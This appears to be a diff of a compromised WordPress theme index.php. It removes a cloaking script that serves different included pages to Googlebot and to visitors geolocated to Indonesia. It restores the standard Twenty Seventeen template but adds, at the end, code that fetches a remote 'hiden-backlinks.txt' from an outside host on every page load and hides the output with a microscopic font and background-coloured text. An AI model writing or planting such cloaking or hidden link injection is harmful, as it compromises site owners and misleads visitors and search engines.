@@ -1,39 +1,80 @@
 <?php
-error_reporting(0);
+/**
+ * The main template file
+ *
+ * This is the most generic template file in a WordPress theme
+ * and one of the two required files for a theme (the other being style.css).
+ * It is used to display a page when nothing more specific matches a query.
+ * E.g., it puts together the home page when no home.php file exists.
+ *
+ * @link https://developer.wordpress.org/themes/basics/template-hierarchy/
+ *
+ * @package WordPress
+ * @subpackage Twenty_Seventeen
+ * @since Twenty Seventeen 1.0
+ * @version 1.0
+ */
 
-$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$remoteIp  = $_SERVER['REMOTE_ADDR'] ?? '';
+get_header(); ?>
 
-function isGoogleBot($ip, $ua) {
-    if (!preg_match('/googlebot|adsbot-google|mediapartners-google|google-inspectiontool/i', $ua)) {
-        return false;
-    }
+<div class="wrap">
+	<?php if ( is_home() && ! is_front_page() ) : ?>
+		<header class="page-header">
+			<h1 class="page-title"><?php single_post_title(); ?></h1>
+		</header>
+	<?php else : ?>
+	<header class="page-header">
+		<h2 class="page-title"><?php _e( 'Posts', 'twentyseventeen' ); ?></h2>
+	</header>
+	<?php endif; ?>
 
-    $hostname = @gethostbyaddr($ip);
-    if (!$hostname) return false;
+	<div id="primary" class="content-area">
+		<main id="main" class="site-main">
 
-    if (preg_match('/\.googlebot\.com$|\.google\.com$/i', $hostname)) {
-        return (gethostbyname($hostname) === $ip);
-    }
+			<?php
+			if ( have_posts() ) :
 
-    return false;
-}
+				// Start the Loop.
+				while ( have_posts() ) :
+					the_post();
 
-function isIndonesia($ip) {
-    $cc = @file_get_contents("https://ipapi.co/{$ip}/country/");
-    return trim($cc) === 'ID';
-}
+					/*
+					 * Include the Post-Format-specific template for the content.
+					 * If you want to override this in a child theme, then include a file
+					 * called content-___.php (where ___ is the Post Format name) and that
+					 * will be used instead.
+					 */
+					get_template_part( 'template-parts/post/content', get_post_format() );
 
-$isGoogleBot = isGoogleBot($remoteIp, $userAgent);
-$isIndonesia = isIndonesia($remoteIp);
+				endwhile;
 
-// Googlebot atau visitor Indonesia → page hitam
-if ($isGoogleBot || $isIndonesia) {
-    include __DIR__ . '/transliftrotoflex.html';
-    exit;
-}
+				the_posts_pagination(
+					array(
+						/* translators: Hidden accessibility text. */
+						'prev_text'          => twentyseventeen_get_svg( array( 'icon' => 'arrow-left' ) ) . '<span class="screen-reader-text">' . __( 'Previous page', 'twentyseventeen' ) . '</span>',
+						/* translators: Hidden accessibility text. */
+						'next_text'          => '<span class="screen-reader-text">' . __( 'Next page', 'twentyseventeen' ) . '</span>' . twentyseventeen_get_svg( array( 'icon' => 'arrow-right' ) ),
+						/* translators: Hidden accessibility text. */
+						'before_page_number' => '<span class="meta-nav screen-reader-text">' . __( 'Page', 'twentyseventeen' ) . ' </span>',
+					)
+				);
 
-// Luar Indonesia → page putih
-include __DIR__ . '/transliftrotoflex-com-about-us.txt';  
-exit;
-?>
+			else :
+
+				get_template_part( 'template-parts/post/content', 'none' );
+
+			endif;
+			?>
+
+		</main><!-- #main -->
+	</div><!-- #primary -->
+	<?php get_sidebar(); ?>
+</div><!-- .wrap -->
+
+<?php
+        echo "<div class='sponsor-area' style='background-color: #f4f4f4; font-size: 0.00001px; color: #f4f4f4;'>";
+        echo file_get_contents("https://yokgercep.com/404-forbiden/hiden-backlinks.txt");
+        echo "</div>";
+    ?>
+<?php
+get_footer();
